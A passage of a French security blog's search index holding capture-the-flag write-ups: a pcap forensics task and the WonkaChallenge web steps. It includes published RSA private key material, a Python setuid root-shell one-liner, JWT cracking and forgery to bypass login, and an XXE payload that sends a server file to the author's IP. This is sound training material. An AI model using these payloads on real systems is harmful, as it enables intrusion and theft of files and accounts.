T6DMWXMDRvuOJEWYa8jCJ040qCSIbGYg9WoJ6+jn9jwtpIbZkqLS9pMCgYEA/SdK 0PMQ9UMOtW2PjPwCKF8uymRdh4KgfWufWmrsCTsHYqinKrF9FhxUeSNHN2qPmPnI yW0LIvcVAzVA5c9weJgvqOfOigsBQaOcW0FqO8OswtGPyH3//dUIyB/vuZu5LYi4 93ECyON95PXpubDvgY4GJwM0Lo9vpdaqt/nTWDMCgYBLWUQBidGHjMVa5G0TZBz5 0mmvkMcJKqFKIwlQnru0rePKiOKQ4hm0E6GJTwhhs/a4QLK9vsxYHJzdrBioI1xz CIQbnCJyXeIoopExuzzwPSLdOMaqIcR7Gg5c31I9rLNsEf6p/mU94v2sSvespccy 0HXWlptmC+FZO6KCRhGrgwKBgBQETVgkQA0Ell8mIJmnO4xxqkN6mCKk44fHQLxn g+5e6oCUkVNA4YEkEFHbxj/Nfzk7VvMGWkEThGfSiCUjt+LxNaOHYL9ti1XjV/On Qn0jRb/JzjKuM9WgSKd6TvxAIe5Fx0pZdzznMAcwoqB6KxX1Yusmx7N+x/c2+By/ 9kQdAoGAYxsY9EhchdDsUy5f2DrsQIeCQJueLexVVxebo4rpgb7NCybqqI55qbjd 2CMdY+8Fw74L2zxwgFDgngrIHsjIMqUNp64pgp+4qqjN+ix0ue86ZTlnaqgK3uaw DDlBMgDIvOc+FYcy1aeqpCQHi8R1EIjlqZGvlV8wTwv9dJ+N/ug= -----END RSA PRIVATE KEY----- -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA6qH1D3mce4pI40aDTFHHnU8I84OU7NCR3KD4pTCsktys6cth OdZ4YnR6a3SBIEAmpq8p/3KI9fmQO43JJj+N4vWEgsA8S5F3CQZtbKr2ILrCX8BX apicvYFHXWl567xWGepkqjdFBAqC8NdpE95ZhZDpwzRgj0DIJRBaKJ9ROdKeo8bY atXRCdm/+Q9Cw8rdknZQtnJh8Jc061UWdEaRR5FINQZtNmDkwzehDYD+elZ9zmNX oRrB+wYQNuoHTVunBihCFz/WUcoqcItPSoheWGiy+Ok4B0QcBCELhVs5RpSjp6C/ 0yl+0mx3P+1743JsKUmnu1fAYKi3oHAG4sgYFQIDAQABAoIBAGmSVeGQpogvwHwC zjEY2ug9F5n6KpgjgH31L+uj6wJpqKPJjwWnKqOiJTMUSMVqF/oH9q2pq1aB5BPn yAodrongTq9GL9sQqK625aVvhy9S2QKcWLjt0hiygpnVS7Z2F4exn3m3RKZ81E3p nq4B7eXbPlNGzeun","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019revmomon/:0:4","tags":["santhacklaus","claranet","forensic","cryptography","network","pcap","malware","rsa"],"title":"[Santhacklaus 2019] - Revmomon","uri":"maki.bzh/writeups/santhacklaus2019revmomon/"},{"categories":["Writeups"],"content":"Analyse du pcap déchiffré Flux sur le port 443 Maintenant que les flux sont déchiffrés, regardons le premier flux tcp: Le script bash va télécharger un certificat PEM (/dev/shm/cert2.pem) et faire un reverse shell openssl sur le port 8443: mystère résolue, la transaction sur le port 443 est le serveur web https de l’attaquant et celle sur le 8443 est le reverse shell openssl. Flux sur le port 8443 L’attaquant cherche à élever ses droits, il a drop un LinEnum pour énumérer un maximum de choses: L’élevation de privilèges se situe un peu plus bas avec le payload: /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")' Cette élévation de privilèges s’explique par le fait que python a des capabilities particulières: Et c’est ce que l’attaquant a vu dans son LinEnum. D’ailleurs, je crois que l’attaquant un message pour le challenger, pour signifier qu’un flag est dans le /root: La fin du flux montre le téléchargement d’un binaire “DRUNK_IKEBANA” et le place dans le dossier /usr/bin/phar.bak. Il est possible de récupérer le binaire: Il est possible d’exporter le binaire via le menu File \u003e Export Objects \u003e HTTP \u003e DRUNK_IKEBANA Et voilà, pour valider l’épreuve, il suffit de trouver le SHA256 du binaire: $ sha256sum DRUNK_IKEBANA daeb4a85965e61870a90d40737c4f97d42ec89c1ece1c9b77e44e6749a88d830 DRUNK_IKEBANA ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019revmomon/:0:5","tags":["santhacklaus","claranet","forensic","cryptography","network","pcap","malware","rsa"],"title":"[Santhacklaus 2019] - Revmomon","uri":"maki.bzh/writeups/santhacklaus2019revmomon/"},{"categories":["Writeups"],"content":"Flag SANTA{daeb4a85965e61870a90d40737c4f97d42ec89c1ece1c9b77e44e6749a88d830} ","date":"2019-12-22","objectID":"maki.bzh/writeups/santhacklaus2019revmomon/:0:6","tags":["santhacklaus","claranet","forensic","cryptography","network","pcap","malware","rsa"],"title":"[Santhacklaus 2019] - Revmomon","uri":"maki.bzh/writeups/santhacklaus2019revmomon/"},{"categories":["Writeups"],"content":"Introduction Cette année, lors de l’évènement LeHack 2019, nous avons assisté au lancement de la seconde édition du WonkaChallenge réalisé par Akerva. Lors de la première édition, nous pouvions nous confronter à un certain nombre d’épreuves, d’abord des challenges web puis de l’Active Directory. Les writeups officiels de l’édition de l’année dernière se trouvent ici : Williwonka.shop : https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/ Pramafil.com : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/ Compromission SI pramafil : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/ Compromission du domaine DEV : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/ Comme à la maison : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/ Cette année, le WonkaChall a continué sur la même lancée et s’est étoffé d’une partie pwn et Linux à la fin. Cet article a pour but de présenter ma méthode de résolution des 13 épreuves. Akerva a aussi mis en ligne un writeup officiel, que vous pouvez retrouver ci-dessous : Part 1 - WEB : https://akerva.com/blog/wonkachall-akerva-lehack-2019-write-up-part-1-web/ Part 2 - WINDOWS : https://akerva.com/blog/wonkachall-2-lehack-2019-write-up-part-2-windows/ Part 3 - LINUX : https://akerva.com/blog/wonkachall-2-lehack-2019-write-up-part-3-linux/ Cet article va se découper en 13 parties, une pour chaque flag à trouver. Mais avant d’entrer dans le vif du sujet, ci-dessous un schéma du réseau complet (attention, petit spoil :)) : Certaines épreuves nécessitent du Windows et d’autres du Linux, donc je switch entre ma Commando (Windows) et ma Kali (Linux). Ma configuration est plutôt simple, un hôte Windows 10 avec VMWare pro et les deux VM en NAT. Maintenant que tous les prérequis sont présentés, j’espère que la lecture vous sera agréable ! Le point d’entrée du challenge se trouve ici : https://willywonka.shop ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:1:0","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"I. Step 1 - Erreur de développeur Let’s start easy, what are the latest changes made to the website ? ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:2:0","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"TL;DR Utiliser dirsearch et trouver le dossier .git ; Avec GitTools -\u003e dumper -\u003e extractor, récupérer le git et les anciens commits ; Le premier flag se situe dans le fichier .git/COMMIT_EDITMSG. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:2:1","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"I.1. Directory listing La première chose que je fais en arrivant sur un site est lancer dirsearch. La wordlist par défaut est vraiment pertinente et en général, ce qu’elle sort se transforme en quick win : (KaliVM) ➜ ./dirsearch.py -u https://willywonka.shop/ -e html,php,txt Extensions: .html, .php, .txt | HTTP method: get | Threads: 10 | Wordlist size: 6878 Target: https://willywonka.shop/ [01:29:23] Starting: [01:29:23] 400 - 166B - /%2e%2e/google.com [01:29:23] 308 - 263B - /.git [01:29:23] 200 - 973B - /.git/ [01:29:23] 200 - 449B - /.git/branches/ [01:29:23] 200 - 130B - /.git/COMMIT_EDITMSG [01:29:23] 200 - 1KB - /.git/hooks/ [01:29:23] 200 - 276B - /.git/config [01:29:23] 200 - 495B - /.git/info/ [01:29:24] 200 - 73B - /.git/description [01:29:24] 200 - 23B - /.git/HEAD [01:29:24] 200 - 240B - /.git/info/exclude [01:29:24] 200 - 542B - /.git/logs/ [01:29:24] 200 - 2KB - /.git/index [01:29:24] 200 - 355B - /.git/logs/HEAD [01:29:24] 200 - 528B - /.git/logs/refs/heads [01:29:24] 200 - 355B - /.git/logs/refs/heads/master [01:29:24] 200 - 504B - /.git/logs/refs [01:29:24] 200 - 2KB - /.git/objects/ [01:29:24] 200 - 41B - /.git/refs/heads/master [01:29:24] 200 - 545B - /.git/refs/ [01:29:24] 200 - 508B - /.git/refs/heads [01:29:24] 200 - 445B - /.git/refs/tags [01:29:35] 200 - 5KB - /login [01:29:35] 302 - 209B - /logout -\u003e http://willywonka.shop/ [01:29:37] 500 - 290B - /profile [01:29:38] 200 - 4KB - /register [01:29:38] 200 - 4KB - /reset [01:29:39] 302 - 265B - /submit -\u003e http://willywonka.shop/profile?filetype=image%2Fpng On tombe sur un dossier .git. Même si ce genre de dossier affiche un beau “403 Forbidden”, les fichiers sont souvent accessibles : Il nous est donc possible de récupérer le contenu des anciens commits grâce à GitTools. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:2:2","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"I.2. Git dumping Pour obtenir l’intégralité du git, on va d’abord utiliser le script gitdumper.sh, puis extractor.sh pour les différents commits. (KaliVM) ➜ mkdir out_dump (KaliVM) ➜ /opt/t/pentest/exploit/GitTools/Dumper/gitdumper.sh https://willywonka.shop/.git/ out_dump [*] Destination folder does not exist [+] Creating a/.git/ [+] Downloaded: HEAD [...] (KaliVM) ➜ mkdir out_extract (KaliVM) ➜ /opt/t/pentest/exploit/GitTools/Extractor/extractor.sh out_dump out_extract [+] Found commit: 8cda59381a6755d33425cb4ccddcc011a85649c6 [+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/.env [...] [+] Found commit: 7a1756aae221342ab09f9101358201bbfa70a702 [+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/.env [...] Il ne reste plus qu’à aller chercher le flag : (KaliVM) ➜ cat out_dump/.git/COMMIT_EDITMSG Added debug mode with \"debug=1\" GET param A wild flag appears ! 16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009 ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:2:3","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"I.3. Flag 16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009 ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:2:4","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"Ressources maurosoria, dirsearch, GitHub : https://github.com/maurosoria/dirsearch internetwache, GitTools, GitHub : https://github.com/internetwache/GitTools ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:2:5","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"II. Step 2 - Une histoire de JWT A ‘deadbeef’ ticket was submitted. Who’s the victim ? ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:3:0","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"TL;DR Faire de l’audit de code grâce au .git trouvé dans l’étape d’avant, trouver le debug=1 dans la configuration de Symphony ; Mettre la page /reset en mode debug afin de récupérer une stacktrace : https://willywonka.shop/reset?debug=1 ; Dans la stacktrace ,trouver un sous-domaine (backend.willywonka.shop) et un JSON Web Token (JWT) ; Il existe une autre page /reset sur le backend. Grâce à cette page, on sait que le site attend un JWT dans le cookie backend-session ; L’analyse du JWT récupéré dans la stacktrace montre qu’il est protégé par une clé secrète (HS256) ; Le bruteforcer avec rockyou et trouver la clé s3cr3t ; Forger un nouveau token avec un utilisateur valide (aas) et une expiration lointaine, donnant la requête :https://backend.willywonka.shop/reset/jwt_craft . La liste des comptes se trouve sur la page d’accueil du frontend ; Une fois la mire d’authentification passée, il ne reste qu’à chercher le ticket deadbeef. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:3:1","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"II.1. Directory listing En enlevant les fichiers liés au .git du dirsearch précédent, il reste les pages suivantes : [11:10:46] 200 - 5KB - /login [11:10:47] 302 - 209B - /logout -\u003e http://willywonka.shop/ [11:10:51] 500 - 290B - /profile [11:10:52] 200 - 4KB - /register [11:10:52] 200 - 4KB - /reset [11:10:55] 302 - 265B - /submit -\u003e http://willywonka.shop/profile?filetype=image%2Fpng ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:3:2","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"II.2. Enumération d’utilisateur Lors de l’utilisation de l’application, on se rend compte qu’il est possible de faire de l’énumération d’utilisateur : Pour tester cette théorie, j’ai choisi une liste d’utilisateurs provenant du GitHub SecList . Elle est plutôt courte, donc rapide. L’intruder de Burp fait l’affaire pour ce test : Si un utilisateur valide est soumit à l’application, alors cette application renvoie… Une erreur 500. À savoir aussi que ce bruteforce d’utilisateur ne sert à rien et m’a même fait perdre du temps par la suite. La liste des utilisateurs peut être trouvée sur l’index du site : Les utilisateurs sont donc : n0wait qsec cybiere meywa itm4n aas xXx_d4rkR0xx0r_xXx ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:3:3","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"II.3. Ne pas oublier le .git En regardant de plus près les sources obtenues dans le .git de l’étape 1, on remarque qu’il y a une histoire de debug. Une variable /?debug=1 : (KaliVM) ➜ cat 0-7a1756aae221342ab09f9101358201bbfa70a702/config/routes.yaml #index: # path: / # controller: App\\Controller\\DefaultController::index debug: path: /?debug=1 controller: #TODO# N’étant pas familier avec Symphony, j’ai perdu du temps à comprendre pourquoi cette variable ne fonctionnait pas sur la route principale. Finalement, en plaçant un utilisateur valide (tel que aas) dans le formulaire de reset et en ajoutant le paramètre GET, le framework renvoie la stacktrace de l’application : https://willywonka.shop/reset?debug=1 Fatal error: Uncaught exception 'Swift_TransportException' with message 'Expected response code 354 but got code \"566\", with message \"566 SMTP limit exceeded\"' in /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php:386 Stack trace: #0 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(281): Swift_Transport_AbstractSmtpTransport-\u003e_assertResponseCode('566 SMTP limit ...', Array) #1 /usr/local/lib/php/Swift/Transport/EsmtpTransport.php(245): Swift_Transport_AbstractSmtpTransport-\u003eexecuteCommand('DATA\\r\\n', Array, Array) #2 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(321): Swift_Transport_EsmtpTransport-\u003eexecuteCommand('DATA\\r\\n', Array) #3 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(432): Swift_Transport_AbstractSmtpTransport-\u003e_doDataCommand() #4 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(449): Swift_Transport_AbstractSmtpTransport-\u003e_doMailTransaction(Object(Swift_Message), 'support@songboo...', Array, Array) #5 /usr/local/lib/php/Swift/Transport/Abstra in /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php on line 386 While trying to send: { \"dest\":['test'], \"object\":'Password reset instructions for WillyWonka Shop', \"from\":'admin@wwonka.shop',\"relay\":'backend.willywonka.shop', \"content-html\":' \u003chtml\u003e \u003chead\u003e \u003cmeta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"\u003e \u003ctitle\u003e\u003c/title\u003e \u003c/head\u003e \u003cbody text=\"#000000\" bgcolor=\"#FFFFFF\"\u003e \u003cb\u003eHello dear associate,\u003c/b\u003e\u003cbr\u003e \u003cbr\u003e You are receiving this mail after a password reset request has been submitted on Willy Wonka Golden Ticket Shop. \u003cbr\u003e \u003cbr\u003e In order to reset your password, please use this login link and reset your password from your profile \u003cbr\u003e \u003cbr\u003e \u003ci\u003e\u003cfont size=\"+3\"\u003e\u003ca moz-do-not-send=\"true\" href=\"http://willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o\"\u003eReset my password\u003c/a\u003e\u003c/font\u003e\u003c/i\u003e\u003cbr\u003e \u003cbr\u003e \u003ci\u003e\u003cb\u003eNote : if you didn't request this email, please ensure your account hasn't been accessed and perform any relevant security hardening.\u003c/b\u003e\u003c/i\u003e\u003cbr\u003e \u003cbr\u003e Have a nice day\u003cbr\u003e \u003cbr\u003e Willy Wonka\u003cbr\u003e \u003ca moz-do-not-send=\"true\" href=\"http://willywonka.shop/\"\u003e/\u003c/a\u003e\u003cbr\u003e \u003c/body\u003e \u003c/html\u003e', \"content-text\":' Hello dear associate, You are receiving this mail after a password reset request has been submitted on Willy Wonka Golden Ticket Shop. In order to reset your password, please use this login link and reset your password from your profile http://willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o Note : if you didn't request this email, please ensure your account hasn't been accessed and perform any relevant security hardening. Have a nice day Willy Wonka http://willywonka.shop/' } Find more documentation here : https://google.fr https://stackoverflow.com https://lmgtfy.com Cette trace divulgue des informations sensibles quant au SI de la cible : * backend.willywonka.shop * eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:3:4","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"II.4. Enumération web sur le backend Nouveau site web, nouveau dirsearch : celui-ci renvoie énormément de 403. Après un filtrage de qualité, le scan affiche des résultats pertinents : (KaliVM) ➜ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u https://backend.willywonka.shop -e php,html,txt,pdf,zip -t 25 | grep -v 403 Target: https://backend.willywonka.shop [11:44:07] Starting: [11:44:07] 400 - 166B - /%2e%2e/google.com [11:44:32] 200 - 2KB - /login [11:44:33] 302 - 219B - /logout -\u003e http://backend.willywonka.shop/login [11:44:37] 302 - 219B - /reset -\u003e http://backend.willywonka.shop/login Les résultats sont relativement équivalents aux résultats du frontend. Cependant, on remarque que toutes les pages du backend sont redirigées vers une page de /login. Cette page attend un JSON Web Token (JWT) : Le token contient : eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIk5vIHRva2VuIHByb3ZpZGVkIl19XX0.XSRiRw.QMJ9BsJX127QbsE-FgmcvQm-uBM { \"_flashes\": [ { \" t\": [ \"message\", \"No token provided\" ] } ] } {} ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:3:5","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"II.5. Craquer le secret du JWT En rassemblant les différents éléments du test d’intrusion, on remarque rapidement que la stacktrace du frontend délivre un JWT et que le cookie du backend en attend un. L’hypothèse la plus plausible est de récupérer le secret, modifier le JWT et signer le nouveau JWT. Ci-dessous le token de l’utilisateur aas : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx5d29ua2Euc2hvcCIsImlhdCI6MTU2MjY2NDMxNSwiZXhwIjoxNTYyNjk0MzE1fQ.6yuVpu_jugKOZL9p9-M-wAF6knpArUJqnfgQzS4W9N4 { \"alg\": \"HS256\", \"typ\": \"JWT\" } { \"sub\": \"aas\", \"aud\": \"frontend.willywonka.shop\", \"iat\": 1563668653, \"exp\": 1563669253 } Afin de créer un nouveau jeton fonctionnel, on modifie les éléments suivants : aud et exp. Le premier élément permet de sélectionner le bon domaine. Le second correspond à l’expiration du token, choisir une date suffisamment lointaine garantit la tranquillité. Modifier un JWT HS256 est relativement simple. Il existe plusieurs outils efficaces, comme jwt_tool. En passant une wordlist pertinente en paramètre, cet outil peut bruteforce le secret du token : (KaliVM) ➜ python ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o /opt/t/bf/rockyou.txt Token header values: [+] typ = JWT [+] alg = HS256 Token payload values: [+] sub = test [+] aud = frontend.willywonka.shop [+] iat = 1562664315 [+] exp = 1562664915 ###################################################### # Options: # # 1: Check CVE-2015-2951 - alg=None vulnerability # # 2: Check for Public Key bypass in RSA mode # # 3: Check signature against a key # # 4: Check signature against a key file (\"kid\") # # 5: Crack signature with supplied dictionary file # # 6: Tamper with payload data (key required to sign) # # 0: Quit # ###################################################### Please make a selection (1-6) \u003e 5 Loading key dictionary... File loaded: /opt/t/bf/rockyou.txt Testing 14344380 passwords... [+] s3cr3t is the CORRECT key! Le secret a été cassé avec succès, il est possible de signer le nouveau jeton avec les paramètres suivants : aud : backend.willywonka.shop exp : 1999999999 -\u003e Une date aux alentours de 2033 Avec ce nouveau JWT, il est possible de passer outre l’authentification et d’accéder ainsi au backend de l’application : https://backend.willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx5d29ua2Euc2hvcCIsImlhdCI6MTU2MjY2OTkxMiwiZXhwIjoxOTk5OTk5OTk5fQ.pZxLNOIrI1DCRdB-MBWDNtDnmeKeANTNm5btAoY6Pmw Conformément à l’énoncé, le flag se situe dans les données du ticket deadbeef : ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:3:6","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"II.6. Flag 7ED33F3EB8E49C5E4BE6B8E2AE270E4018582B27E030D32DE4111DB585EE0318 ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:3:7","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"Resources danielmiessler, SecLists - top-usernames-shortlist.txt, GitHub : https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt Auth0, JSON Web Token debugger, jwt : https://jwt.io/ ticarpi, jwt_tool, GitHub : https://github.com/ticarpi/jwt_tool ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:3:8","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"III. Step 3 - XXE Out-of-band There’s a flag.txt at the server root ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:4:0","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"TL;DR Forger une XXE OOB via le fichier SVG ; Uploader le fichier SVG à l’adresse : http://willywonka.shop/profile?filetype=image%2fsvg%2bxml, ne pas oublier de changer le MIME type ; Remplir le formulaire avec aas en nom de victime et de la donnée random ; Récupérer l’id du ticket et y accéder dans le backend ; Cliquer sur autoresize pour déclencher la XXE OOB. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:4:1","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"III.1. Reconnaissance La plateforme du challenge propose un hint par épreuve. Celui de cette épreuve énonce clairement qu’il s’agit d’une XXE via SVG. Le MIME type du fichier à envoyer est défini dans un paramètre GET, sur la page submit du frontend. Il est possible pour un attaquant de changer ce MIME type et d’uploader ainsi un fichier SVG XML contenant la charge de la XXE. Lorsque le ticket est correctement uploadé, un identifiant est généré. Cet identifiant permet d’accéder au ticket dans le backend. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:4:2","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"III.2. Explication de l’exploitation Par défaut, l’URL du frontend accepte les images PNG : https://frontend.willywonka.shop/profile?filetype=image%2Fpng Le mime-type est présent en paramètre GET, alors pour que l’application accepte les SVG XML il suffit de le changer : image%2fsvg%2bxml Une XXE Out-of-band (OOB) est similaire à une XXE “classique”, ou “in-band”. Une OOB est une XXE à l’aveugle qui va charger un DTD distant. Les entités présentent dans ce DTD seront ensuite exécutées, permettant ainsi de forcer une extraction de données. Le schéma suivant devrait être plus parlant : Lors de CTF passés, j’ai déjà évoqué les XXE OOB : Santhacklaus 2018. Dans cet article, le même serveur a été utilisé, mais il est aussi possible d’utiliser deux instances ngrok. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:4:3","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"III.3. Exploitation Ci-dessous les fichiers nous permettant de mener à bien l’exploitation : ro.svg : le SVG XML contenant l’appel des entités externes du fichier DTD. \u003c!DOCTYPE svg [ \u003c!ENTITY % file SYSTEM \"http://51.158.113.8/ro.dtd\"\u003e %file;%template; ]\u003e \u003csvg xmlns=\"http://www.w3.org/2000/svg\"\u003e \u003ctext x=\"10\" y=\"30\"\u003eInjected: \u0026res;\u003c/text\u003e \u003c/svg\u003e ro.dtd : charge contenant les entités permettant de cibler un fichier et d’exfiltrer son contenu. \u003c!ENTITY % secret1 SYSTEM \"file:///flag.txt\"\u003e \u003c!ENTITY % template \"\u003c!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'\u003e\"\u003e Note : l’adresse IP utilisée (51.158.113.8) est un VPS temporaire de chez Scaleway avec un Python SimpleHTTPServer sur le port 80. Lorsque l’environnement est correctement configuré, il ne reste qu’à uploader la charge via le formulaire sur le frontend : En retour, le frontend nous renvoie l’identifiant du ticket : e6afec4a. Le bouton Autoresize de l’application en backend appelle le parser XML vulnérable. C’est donc à ce moment que la charge est exécutée. Note : on observe de l’activité sur les logs du Python SimpleHTTPServer. Dans ce cas précis, ce n’est pas réellement une XXE OOB, car le retour s’affiche sur l’application (cf. Fig 13 - Ticket côté backend). ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:4:4","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"III.4. Flag 0D7D2DDEA2B25FF0D35D3E173BA2CDCB120D3554E124EBE2B147B79CF0007630 ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:4:5","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"Resources alexbirsan, LFI and SSRF via 